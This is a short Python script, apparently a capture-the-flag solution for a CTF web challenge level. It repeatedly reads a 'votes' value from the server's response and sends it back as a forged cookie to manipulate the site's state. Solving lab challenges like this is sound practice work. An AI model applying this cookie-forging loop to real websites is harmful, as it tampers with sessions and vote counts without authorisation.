import requests

url = 'http://kslweb1.spb.ctf.su/second/level23/'
r = requests.get(url)
'''
for i in range(17):
   if i < 10:
      print('xer')
   else:
      print('err')
'''


for i in range(98):
   if i > 1:
      r = requests.get(url, cookies=jar)

   stat = r.text

   print(stat)
   print('\n')

   stvots = 'votes'
   str = ''
   
   for j in range(len(stat)):
      if (stat[j] == '=') and (stat[(j-1)] == 's'):
        j += 1
        while stat[j]!='\n':
          str += stat[j]
          j += 1
        break
  
   print(str)
   jar = requests.cookies.RequestsCookieJar()
   jar.set(name=stvots, value=str)
   r = requests.get(url, cookies=jar)
   print(r.text)



